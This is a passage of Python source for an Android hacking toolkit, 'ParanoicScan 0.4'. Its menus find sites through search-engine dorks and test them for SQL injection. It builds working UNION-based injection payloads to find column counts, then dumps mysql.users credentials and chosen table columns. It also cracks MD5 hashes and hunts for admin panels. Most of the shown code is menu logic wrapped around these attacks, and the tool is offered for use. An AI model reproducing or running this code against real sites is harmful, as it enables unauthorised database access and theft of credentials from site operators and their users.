    tabla = ref['value']
    aplicacion.dialogCreateSpinnerProgress("SQLI Scanner","[+] Searching Columns of DB ...")
    aplicacion.dialogShow()
 
    don = showcolumnsdb(webvul,db,tabla)
   
    aplicacion.dialogDismiss()
 
    aplicacion.dialogCreateAlert("SQLI Scanner",don)
    aplicacion.dialogSetPositiveButtonText("Done")
    aplicacion.dialogShow()
 
    op = aplicacion.dialogGetResponse().result
 
    if op["which"] == "positive" :
     menusql()
 
 if opsql==5 :
 
  aplicacion.dialogCreateAlert("SQLI Scanner")
  aplicacion.dialogCreateSpinnerProgress("SQLI Scanner","[+] Searching mysql.users ...")
  aplicacion.dialogShow()
 
  don = mysqluser(webvul)
 
  aplicacion.dialogDismiss()
 
  aplicacion.dialogCreateAlert("SQLI Scanner",don)
  aplicacion.dialogSetPositiveButtonText("Done")
  aplicacion.dialogShow()
 
  op = aplicacion.dialogGetResponse().result
 
  if op["which"] == "positive" :
   menusql()
 
 if opsql==6 :
 
  aplicacion.dialogCreateAlert("SQLI Scanner")
  aplicacion.dialogCreateSpinnerProgress("SQLI Scanner","[+] Getting Information ...")
  aplicacion.dialogShow()
 
  don = more(webvul)
 
  aplicacion.dialogDismiss()
 
  aplicacion.dialogCreateAlert("SQLI Scanner",don)
  aplicacion.dialogSetPositiveButtonText("Done")
  aplicacion.dialogShow()
 
  op = aplicacion.dialogGetResponse().result
 
  if op["which"] == "positive" :
   menusql()
 
 if opsql==7 :
 
  aplicacion.dialogCreateAlert("SQLI Scanner")
 
  aplicacion.dialogGetInput("SQLI Scanner","Enter Table")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menusql()
  else:  
   tabla = ref['value']
 
   aplicacion.dialogGetInput("SQLI Scanner","Enter Column1")
   ref = aplicacion.dialogGetResponse().result
 
   if not ref['which'] == 'positive' :
    menusql()
   else:
    columna1 = ref['value']
    aplicacion.dialogGetInput("SQLI Scanner","Enter Column2")
    ref = aplicacion.dialogGetResponse().result
    if not ref['which'] == 'positive' :
     menusql()
    else:  
     columna2 = ref['value']
     aplicacion.dialogCreateSpinnerProgress("SQLI Scanner","[+] Getting Values ...")
     aplicacion.dialogShow()
 
     don = dumper(webvul,tabla,columna1,columna2)
   
     aplicacion.dialogDismiss()
     aplicacion.dialogCreateAlert("SQLI Scanner",don)
     aplicacion.dialogSetPositiveButtonText("Done")
     aplicacion.dialogShow()  
     op = aplicacion.dialogGetResponse().result
 
     if op["which"] == "positive" :
      menusql()
 
 if opsql==8:
  menu()
 
def menu():
 
 aplicacion.dialogCreateAlert("ParanoicScan 0.4 (C) Doddy Hackman 2015")
 aplicacion.dialogSetItems(["BingHackTool","SQLI Scanner","MD5 Cracker","Admin Finder","Locate IP","HTTP FingerPrinting","Encoders","About","Exit"])
 aplicacion.dialogShow()
 re = aplicacion.dialogGetResponse().result
 re2 = re["item"]
 
 if re2==0:
 
  aplicacion.dialogCreateAlert("BingHack Tool")
 
  aplicacion.dialogGetInput("BingHack Tool","Enter Dork")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menu()
  else:  
   dork = ref['value']
 
   aplicacion.dialogGetInput("BingHack Tool","Enter number of pages to search")
   ref = aplicacion.dialogGetResponse().result
 
   if not ref['which'] == 'positive' :
    menu()
   else:
    paginas = ref['value']
 
    paginas = str(paginas)
 
    aplicacion.dialogCreateSpinnerProgress("BingHack Tool","Searching ...")
    aplicacion.dialogShow()
 
    founds = ""
    rez = ""
    rtafinal = ""
 
    founds = bingscan(dork,paginas)
 
    aplicacion.dialogDismiss()
 
    aplicacion.dialogCreateSpinnerProgress("BingHack Tool","Scanning ...")
    aplicacion.dialogShow()
 
    rez = sqltest(founds)
 
    if len(rez) == 0 :
     rtafinal = "[-] Not Found"
    else :
     rtafinal = "[++] Pages Founds\n\n"
     rtafinal = rtafinal + rez
     rtafinal = rtafinal + "\n[++] Finished\n"
 
    aplicacion.dialogDismiss()
 
    aplicacion.dialogCreateAlert("BingHack Tool",rtafinal)
    aplicacion.dialogSetPositiveButtonText("Done")
    aplicacion.dialogShow()
 
    op = aplicacion.dialogGetResponse().result
    if op["which"] == "positive" :
     menu()
 
 if re2==1 :
         
  global webvul
 
  aplicacion.dialogCreateAlert("SQLI Scanner")
 
  aplicacion.dialogGetInput("SQLI Scanner","Enter Page")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menu()
  else:  
   web = ref['value']
   aplicacion.dialogCreateSpinnerProgress("SQLI Scanner","[+] Scanning ...")
   aplicacion.dialogShow()
 
   pass1,pass2 = bypass("--")
   code = toma(web+"1"+pass1+"and"+pass1+"1=0"+pass2)
   codedos = toma(web+"1"+pass1+"and"+pass1+"1=1"+pass2)
 
   if not code==codedos:
    aplicacion.dialogDismiss()
    aplicacion.dialogCreateAlert("SQLI Scanner","[+] SQLI Detected")
    aplicacion.dialogSetPositiveButtonText("Done")
    aplicacion.dialogShow()
    op = aplicacion.dialogGetResponse().result
    if op["which"] == "positive" :
 
     pass1,pass2 = bypass("--")
     rtacondata = ""
     control_sql = 0
 
     aplicacion.dialogCreateSpinnerProgress("SQLI Scanner","[+] Finding columns length")
     aplicacion.dialogShow()
 
     number = "unhex(hex(concat(0x4b30425241,1,0x4b30425241)))"
     for te in range(2,30):
      number = str(number)+","+"unhex(hex(concat(0x4b30425241,"+str(te)+",0x4b30425241)))"
      code = toma(web+"1"+pass1+"and"+pass1+"1=0"+pass1+"union"+pass1+"select"+pass1+number+pass2)
      if(regexver(code)):
       numbers = regexdar(code)
       
       control_sql = 1
 
       rtacondata = rtacondata + "[+] Column length : "+str(te)
       rtacondata = rtacondata + "\n[+] Numbers "+str(numbers)+" print data"
 
       sql = ""
       tex = te + 1
       for sqlix in range(2,tex):
        sql = str(sql)+","+str(sqlix)
        sqli  = str(1)+sql
       sqla = reem(sqli,numbers[0])
       aplicacion.dialogDismiss()
       aplicacion.dialogCreateAlert("SQLI Scanner",rtacondata)
       aplicacion.dialogSetPositiveButtonText("Done")
       aplicacion.dialogShow()
       op = aplicacion.dialogGetResponse().result
       if op["which"] == "positive" :
            webvul = web+"-1"+pass1+"union"+pass1+"select"+pass1+sqla
            menusql()
 
     if control_sql==0:
 
      aplicacion.dialogDismiss()
      aplicacion.dialogCreateAlert("SQLI Scanner","[-] Length dont found")
      aplicacion.dialogSetPositiveButtonText("Done")
      aplicacion.dialogShow()
      op = aplicacion.dialogGetResponse().result
      if op["which"] == "positive" :
       aplicacion.exit()
 
   else:
    aplicacion.dialogDismiss()
    aplicacion.dialogCreateAlert("SQLI Scanner","[-] Not Vulnerable")
    aplicacion.dialogSetPositiveButtonText("Done")
    aplicacion.dialogShow()
    op = aplicacion.dialogGetResponse().result
    if op["which"] == "positive" :
     aplicacion.exit()
 
 if re2==2 :
 
  aplicacion.dialogCreateAlert("MD5 Cracker")
 
  aplicacion.dialogGetInput("MD5 Cracker","Enter MD5")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menu()
  else:  
   target = ref['value']
 
   aplicacion.dialogCreateSpinnerProgress("MD5 Cracker","[+] Cracking ...")
   aplicacion.dialogShow()
 
   don = crackmd5(target)
 
   aplicacion.dialogDismiss()
 
   aplicacion.dialogCreateAlert("MD5 Cracker",don)
   aplicacion.dialogSetPositiveButtonText("Done")
   aplicacion.dialogShow()
 
   op = aplicacion.dialogGetResponse().result
 
   if op["which"] == "positive" :
    menu()
 
 if re2==3 :
 
  aplicacion.dialogCreateAlert("Admin Finder")
 
  aplicacion.dialogGetInput("Admin Finder","Enter Target")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menu()
  else:  
   target = ref['value']
 
   aplicacion.dialogCreateSpinnerProgress("Admin Finder","[+] Searching ...")
   aplicacion.dialogShow()
 
   don = scanpanel(target)
 
   aplicacion.dialogDismiss()
 
   aplicacion.dialogCreateAlert("Admin Finder",don)
   aplicacion.dialogSetPositiveButtonText("Done")
   aplicacion.dialogShow()
 
   op = aplicacion.dialogGetResponse().result
 
   if op["which"] == "positive" :
    menu()
 
 if re2==4 :
 
  aplicacion.dialogCreateAlert("LocateIP")
 
  aplicacion.dialogGetInput("LocateIP","Enter Target")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menu()
  else:
   target = ref['value']
 
   aplicacion.dialogCreateSpinnerProgress("LocateIP","[+] Searching ...")
   aplicacion.dialogShow()
 
   don = locateip(target)
 
   aplicacion.dialogDismiss()
 
   aplicacion.dialogCreateAlert("LocateIP",don)
   aplicacion.dialogSetPositiveButtonText("Done")
   aplicacion.dialogShow()
 
   op = aplicacion.dialogGetResponse().result
 
   if op["which"] == "positive" :
    menu()
 
 if re2==5 :
 
  aplicacion.dialogCreateAlert("HTTP FingerPrinting")
 
  aplicacion.dialogGetInput("HTTP FingerPrinting","Enter Target")
  ref = aplicacion.dialogGetResponse().result
 
  if not ref['which'] == 'positive' :
   menu()
  else:
   target = ref['value']
 
   aplicacion.dialogCreateSpinnerProgress("HTTP FingerPrinting","[+] Scanning ...")
   aplicacion.dialogShow()
 
   don = httpfinger(target)
 
   aplicacion.dialogDismiss()
 
   aplicacion.dialogCreateAlert("HTTP FingerPrinting",don)
   aplicacion.dialogSetPositiveButtonText("Done")
   aplicacion.dialogShow()
 
   op = aplicacion.dialogGetResponse().result
 
   if op["which"] == "positive" :
    menu()
 
 if re2==6 :
  menuencoder()
 
 if re2==7 :
 
   about = "This program was written by Doddy Hackman in the summer of 2015"
   aplicacion.dialogCreateAlert("About",about)
   aplicacion.dialogSetPositiveButtonText("Done")
   aplicacion.dialogShow()
 
   op = aplicacion.dialogGetResponse().result
 
   if op["which"] == "positive" :
    menu()
 
 if re2==8 :
  aplicacion.exit()
 
menu()
 
# The End ?
